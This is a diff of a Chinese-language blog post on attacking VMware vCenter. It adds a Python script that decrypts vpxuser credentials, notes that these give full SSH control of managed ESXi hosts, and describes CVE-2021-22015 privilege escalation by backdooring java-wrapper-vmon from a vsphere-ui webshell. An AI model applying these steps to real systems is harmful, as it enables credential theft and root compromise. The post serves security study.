+</span></span><span class="line"><span class="cl">            <span class="n">encrypt_passwords</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">encrypt_password</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">encrypt_passwords</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">get_key</span><span class="p">(</span><span class="n">path</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">path</span><span class="p">)</span> <span class="k">as</span> <span class="n">file</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="n">file</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">key</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">usage</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">key</span> <span class="o">=</span> <span class="n">get_key</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">encrypt_passwords</span> <span class="o">=</span> <span class="n">get_encrypt_password</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="n">save_path</span> <span class="o">=</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">    <span class="n">passwords</span> <span class="o">=</span> <span class="n">decrypt</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="n">encrypt_passwords</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">save_decrypt_password</span><span class="p">(</span><span class="n">save_path</span><span class="p">,</span> <span class="n">passwords</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>上述获取到的 <code>vpxuser</code> 是在 ESXi 与 vCenter 的第一次连接中自动创建的高权限用户。</p>
+<p>vpxuser 用户是默认在 ESXi 上创建的，它是根据最小权限原则设计的，所以它可以由 vCenter 管理而不使用 root。该用户是通过一个名为 <code>vpxd</code> 的进程创建的，它负责 ESXi 和 vCenter 之间的通信。</p>
+<p>关于这个用户的信息并不多，在 ESXi 上的 <code>passwd</code> 文件中发现了一个关于它的注释 - <code>VMware VirtualCenter administrator account</code>。</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101046635.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101046635.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101046635.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101046635.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101046635.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101046635.png-water_print" /></p>
+<p>最后，使用 vpxuser 凭证通过 SSH 连接到具有高权限的被管理的 ESXi，并可以对 ESXi 完全控制：提取虚拟机的内存、列出库存、获取敏感文件、访问敏感信息等。</p>
+<h3 id="33-cve-2021-22015---vcenter-提权漏洞">3.3 CVE-2021-22015 - vCenter 提权漏洞</h3>
+<p><a href="https://www.pentera.io/blog/vscalation-cve-2021-22015-local-privilege-escalation-in-vmware-vcenter-pentera-labs/" target="_blank" rel="noopener noreffer">CVE-2021-22015 - vCenter 提权漏洞</a></p>
+<p>分析 vCenter 中以 root 权限运行的进程，发现如下在同一个文件夹下运行的 java 进程均链接到同一个文件：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101717074.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101717074.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101717074.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101717074.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101717074.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101717074.png-water_print" /></p>
+<p>查看 <code>/usr/lib/vmware-vmon/java-wrapper-vmon</code> 修改权限：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101718462.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101718462.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101718462.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101718462.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101718462.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101718462.png-water_print" /></p>
+<p>cis 用户组可以修改该文件。在 <code>/etc/group</code> 下查看 cis 用户组中的相关用户：</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101719473.png-water_print"
+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101719473.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101719473.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101719473.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101719473.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/202205101719473.png-water_print" /></p>
+<p>发现 <code>vsphere-ui</code> 用户在其中，说明该用户可以修改 java-wrapper-vmon 文件。配合第二节的文件上传漏洞，在  <code>vsphere-ui</code> webshell 的权限下，将后门代码添加到 java-wrapper-vmon 中，并重启服务(<code>service-control --start --all</code>)，可以以 root 权限运行后门代码，达到提权的目的。</p>
 <p>参考：</p>
 <ul>
 <li><a href="https://www.anquanke.com/post/id/234112" target="_blank" rel="noopener noreffer">VMware vCenter RCE 漏洞踩坑实录</a></li>
@@ -789,12 +1203,14 @@
 <li><a href="https://0x20h.com/p/7cb6" target="_blank" rel="noopener noreffer">CVE-2021-21972 复现和分析</a></li>
 <li><a href="https://xz.aliyun.com/t/10524" target="_blank" rel="noopener noreffer">CVE-2021-22005-CEIP分析</a></li>
 <li><a href="https://censys.io/vmware-cve-2021-22005-technical-impact-analysis/" target="_blank" rel="noopener noreffer">VMware CVE-2021-22005 Technical &amp; Impact analysis</a></li>
+<li><a href="https://3gstudent.github.io/vSphere%e5%bc%80%e5%8f%91%e6%8c%87%e5%8d%976-vCenter-SAML-Certificates" target="_blank" rel="noopener noreffer">vSphere开发指南6——vCenter SAML Certificates</a></li>
+<li><a href="https://www.pentera.io/blog/information-disclosure-in-vmware-vcenter/" target="_blank" rel="noopener noreffer">CVE-2022-22948: Sensitive Information Disclosure in VMware vCenter</a></li>
 </ul>
 </div><div class="post-footer" id="post-footer">
     <div class="post-info">
         <div class="post-info-line">
             <div class="post-info-mod">
-                <span>更新于 2022-05-08</span>
+                <span>更新于 2022-05-10</span>
             </div>
             <div class="post-info-license"></div>
         </div>
